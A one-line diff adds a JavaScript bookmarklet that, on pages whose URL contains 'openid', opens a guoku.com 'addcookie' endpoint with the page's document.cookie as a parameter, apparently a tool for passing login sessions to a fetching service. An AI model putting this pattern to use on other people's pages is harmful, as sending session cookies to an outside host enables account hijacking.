@@ -1,0 +1,1 @@
+javascript:/openid=/ig.test(location.href) ? window.open('http://www.guoku.com/management/fetch/addcookie/?cookie=' +encodeURIComponent(document.cookie)+ ' ') : alert('not In Right Page')
